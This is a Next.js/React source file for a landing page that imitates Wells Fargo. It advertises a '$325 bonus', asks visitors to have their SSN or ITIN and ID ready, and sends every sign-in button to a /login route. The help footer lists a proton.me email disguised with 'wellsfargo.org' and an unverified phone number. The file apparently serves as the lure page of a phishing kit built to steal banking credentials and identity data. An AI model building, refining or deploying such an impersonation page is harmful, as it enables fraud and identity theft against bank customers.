'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import { ChevronDown, Globe } from 'lucide-react';

export default function LandingPage() {
  const router = useRouter();
  const [showDisclaimer, setShowDisclaimer] = useState(false);

  return (
    <div className="animate-in">
      {/* 2. Header */}
      <header className="header-row">
        <div style={{ display: 'flex', alignItems: 'center', gap: '4px', color: '#333', fontSize: '13px' }}>
          <Globe size={16} />
          <span>Español</span>
        </div>
        <div className="serif-logo" style={{ fontSize: '18px', position: 'absolute', left: '50%', transform: 'translateX(-50%)' }}>
          WELLS FARGO
        </div>
        <div style={{ width: 60 }}></div>
      </header>

      {/* 3. Hero Graphic */}
      <div style={{ display: 'flex', justifyContent: 'center', padding: '40px 0' }}>
        <svg width="240" height="120" viewBox="0 0 240 120" fill="none" xmlns="http://www.w3.org/2000/svg">
          {/* Clouds */}
          <circle cx="40" cy="40" r="10" fill="#E3F2FD" />
          <circle cx="55" cy="45" r="12" fill="#E3F2FD" />
          <circle cx="180" cy="30" r="8" fill="#E3F2FD" />
          <circle cx="195" cy="35" r="10" fill="#E3F2FD" />
          
          {/* Scooter Body */}
          <rect x="90" y="85" width="60" height="10" rx="5" fill="#D1121F" />
          <path d="M140 85L150 65H160L155 85H140Z" fill="#D1121F" />
          <rect x="150" y="60" width="10" height="5" fill="#333" />
          
          {/* Wheels */}
          <circle cx="100" cy="95" r="8" fill="#333" />
          <circle cx="100" cy="95" r="4" fill="#999" />
          <circle cx="150" cy="95" r="8" fill="#333" />
          <circle cx="150" cy="95" r="4" fill="#999" />
          
          {/* Person (Simplified) */}
          <circle cx="125" cy="55" r="8" fill="#FFCCBC" />
          <rect x="120" y="63" width="15" height="22" fill="#333" />
          <path d="M120 70L110 80H115L120 75V70Z" fill="#333" />
          
          {/* Ground Line */}
          <line x1="20" y1="105" x2="220" y2="105" stroke="#EEE" strokeWidth="2" />
        </svg>
      </div>

      <div className="page-container">
        {/* 4. Main Offer Typography */}
        <h1 className="offer-h1">Get your $325 bonus</h1>
        <h2 className="offer-h2">Everyday Checking</h2>
        <p className="offer-subtitle" style={{ marginBottom: '24px' }}>Offer expires 07/14/2026</p>

        {/* 5. Unordered List */}
        <ul style={{ listStyleType: 'disc', paddingLeft: '20px', marginBottom: '32px', fontSize: '15px' }}>
          <li style={{ marginBottom: '12px' }}>Existing customers <strong>sign on</strong> to apply faster</li>
          <li>Have your SSN or ITIN and ID card handy</li>
        </ul>

        {/* 6. Form Element (Toggle) */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '32px' }}>
          <label className="toggle-switch">
            <input type="checkbox" />
            <span className="slider"></span>
          </label>
          <span style={{ fontSize: '15px', color: '#000' }}>I&apos;m applying for a joint account</span>
        </div>

        {/* 7. Call-to-Action Buttons */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '15px', marginBottom: '40px' }}>
          <button className="btn-pill btn-pill-primary" onClick={() => router.push('/login')}>
            Sign in
          </button>
          <button className="btn-pill btn-pill-outline" onClick={() => router.push('/login')}>
            Sign on
          </button>
        </div>

        {/* 8. Disclaimers & Footer */}
        <div className="footer-text" style={{ marginBottom: '40px' }}>
          <p style={{ marginBottom: '12px' }}><strong>By selecting Sign in or Sign on:</strong></p>
          <p>
            You authorize your wireless carrier to use or disclose information about your account and your wireless device, if available, to Wells Fargo...
          </p>
          
          {showDisclaimer && (
            <div style={{ marginTop: '12px', fontSize: '12px', color: '#666' }}>
              <p style={{ marginBottom: '8px' }}>Offer Eligibility: This offer is for new checking customers only. Must open a new Everyday Checking account and receive a total of $1,000 or more in qualifying direct deposits within 90 days of account opening.</p>
              <p>Wireless Carrier Disclosure: You authorize your wireless carrier to use or disclose information about your account and your wireless device, if available, to Wells Fargo or its service provider for the duration of your business relationship, solely to help them identify you or your wireless device and to prevent fraud.</p>
            </div>
          )}

          <div 
            onClick={() => setShowDisclaimer(!showDisclaimer)}
            style={{ display: 'flex', alignItems: 'center', gap: '4px', color: '#000', fontWeight: 600, marginTop: '12px', cursor: 'pointer' }}
          >
            {showDisclaimer ? 'Show less' : 'Show more'} <ChevronDown size={16} style={{ transform: showDisclaimer ? 'rotate(180deg)' : 'none' }} />
          </div>
        </div>
      </div>

      <div className="bottom-footer">
        <div style={{ marginBottom: '16px', fontSize: '13px', color: '#333' }}>
          <strong>Need Help?</strong> <br />
          Call: +1 786-872-0946 <br />
          Email: onlinefeedbackwellsfargo.org@proton.me
        </div>
        Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
      </div>
    </div>
  );
}
